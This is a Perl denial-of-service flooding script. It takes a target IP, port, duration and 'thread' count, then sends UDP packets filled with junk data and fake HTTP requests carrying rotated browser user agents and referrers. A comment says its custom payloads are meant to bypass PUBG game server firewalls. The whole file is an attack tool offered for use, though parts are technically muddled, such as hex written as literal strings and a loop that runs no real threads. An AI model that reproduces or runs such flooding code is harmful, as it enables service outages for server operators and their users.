#!/usr/bin/perl

use strict;
use warnings;
use IO::Socket::INET;

# Check for command-line arguments
if (@ARGV < 4) {
    die "Usage: $0 <ip> <port> <time> <threads>\n";
}

# Parse command-line arguments
my ($ip, $port, $time, $threads) = @ARGV;

# User agents
my @user_agents = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.109 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0"
);

# Referrer
my @referrers = (
    "http://www.google.com/",
    "http://www.bing.com/",
    "http://www.yahoo.com/",
    "http://www.facebook.com/",
    "http://www.twitter.com/",
    "http://www.reddit.com/",
    "http://www.instagram.com/"
);

# Payloads
my @payloads = (
    "A" x 1000,
    "B" x 1000,
    "C" x 1000,
    "D" x 1000,
    "E" x 1000,
    "F" x 1000,
    "G" x 1000,
    "H" x 1000,
    "I" x 1000,
    "J" x 1000,
    "GET / HTTP/1.1\r\nHost: $ip\r\nUser-Agent: $user_agents[int(rand(@user_agents))]\r\nReferer: $referrers[int(rand(@referrers))]\r\nConnection: keep-alive\r\n\r\n",
    "POST / HTTP/1.1\r\nHost: $ip\r\nUser-Agent: $user_agents[int(rand(@user_agents))]\r\nReferer: $referrers[int(rand(@referrers))]\r\nContent-Length: 100\r\nConnection: keep-alive\r\n\r\n" . "A" x 100,
    "OPTIONS / HTTP/1.1\r\nHost: $ip\r\nUser-Agent: $user_agents[int(rand(@user_agents))]\r\nReferer: $referrers[int(rand(@referrers))]\r\nConnection: keep-alive\r\n\r\n",
    "HEAD / HTTP/1.1\r\nHost: $ip\r\nUser-Agent: $user_agents[int(rand(@user_agents))]\r\nReferer: $referrers[int(rand(@referrers))]\r\nConnection: keep-alive\r\n\r\n",
    "PUT / HTTP/1.1\r\nHost: $ip\r\nUser-Agent: $user_agents[int(rand(@user_agents))]\r\nReferer: $referrers[int(rand(@referrers))]\r\nContent-Length: 100\r\nConnection: keep-alive\r\n\r\n" . "A" x 100,
    "PATCH / HTTP/1.1\r\nHost: $ip\r\nUser-Agent: $user_agents[int(rand(@user_agents))]\r\nReferer: $referrers[int(rand(@referrers))]\r\nContent-Length: 100\r\nConnection: keep-alive\r\n\r\n" . "A" x 100
);

# Custom payloads for bypassing PUBG server firewalls
my @custom_payloads = (
    "0xFFFFFFFFFFFFFFFFFFFF", # Flood packet with invalid data
    "0x01010101010101010101", # Flood packet with constant data
    "0x0" x 5000,             # Flood packet with zeros
    "0xFF" x 5000,             # Flood packet with ones
    "0x41424344454647484950"  # Flood packet with ASCII characters
);

# Create sockets and start flooding
for (my $i = 0; $i < $threads; $i++) {
    my $payload = $payloads[int(rand(@payloads))];
    my $custom_payload = $custom_payloads[int(rand(@custom_payloads))];
    my $socket = IO::Socket::INET->new(
        Proto    => 'udp',
        PeerPort => $port,
        PeerAddr => $ip,
    ) or die "Socket creation failed $!\n";

    my $start_time = time();
    while ((time() - $start_time) < $time) {
        $socket->send($payload);
        $socket->send($custom_payload);
    }
    close($socket);
}
